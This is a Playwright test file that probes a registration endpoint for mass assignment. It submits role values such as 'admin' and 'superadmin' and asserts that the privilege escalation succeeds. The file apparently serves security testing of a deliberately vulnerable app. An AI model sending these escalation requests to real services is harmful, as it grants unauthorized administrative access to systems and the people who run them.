import { test, expect } from '@playwright/test';

test.describe('/api/register (Mass Assignment)', () => {
  test('POST register with admin role escalation', async ({ request }) => {
    const username = `admin_${Date.now()}`;
    
    const response = await request.post('/api/register', {
      data: {
        username: username,
        password: 'password123',
        email: `${username}@test.com`,
        role: 'admin'
      }
    });
    
    const data = await response.json();
    
    expect(data.success).toBeTruthy();
    expect(data.role).toBe('admin');
    
    console.log('Mass assignment successful - Registered as admin');
    console.log(`  User ID: ${data.userId}, Role: ${data.role}`);
  });

  test('POST register with arbitrary role values', async ({ request }) => {
    const roles = ['admin', 'superadmin', 'moderator'];
    
    console.log('Testing mass assignment with different roles:');
    
    for (const role of roles) {
      const username = `user_${role}_${Date.now()}`;
      
      const response = await request.post('/api/register', {
        data: {
          username: username,
          password: 'test',
          email: `${username}@test.com`,
          role: role
        }
      });
      
      const data = await response.json();
      
      if (data.success) {
        console.log(`  Role "${role}": Success`);
      }
    }
  });
});
